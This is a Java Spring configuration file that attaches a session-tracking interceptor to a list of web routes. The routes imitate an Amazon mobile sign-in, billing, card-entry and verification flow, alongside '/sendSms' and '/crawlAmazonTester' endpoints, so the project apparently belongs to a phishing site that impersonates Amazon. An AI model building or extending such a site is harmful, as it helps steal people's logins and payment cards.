package com.kidd.amazon.config;

import com.kidd.amazon.interceptor.SessionInfoInterceptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;


@Configuration
public class InterceptorConfig implements WebMvcConfigurer {

    @Autowired
    private SessionInfoInterceptor sessionInfoInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(sessionInfoInterceptor)
                //.addPathPatterns("/**")
                .addPathPatterns("/amazon2/mobile/signin",
                        "/amazon2/mobile/homepage/billing",
                        "/amazon2/mobile/homepage/card",
                        "/amazon2/mobile/homepage/secure",
                        "/amazon2/mobile/homepage/success",
                        "/zipcode",
                        "/thanks",
                        "/verified",
                        "/user-verified",
                        "/kiddbilling",
                        "/user-bill",
                        "/warn",
                        "/kiddSigin",
                        "/signin"
                        )
                .excludePathPatterns("/aa/**","/assets/**","/library/**",
                        "/css/**","/sheets/**","/style/**","/robots.txt","/test","/favicon.ico"
                        ,"/gp/**","/error/**","/thanks","/count","/crawlAmazonTester","/sendSms"
                ,"/amazon2/mobile/js/**",
                        "/amazon2/mobile/style/**");

    }

}
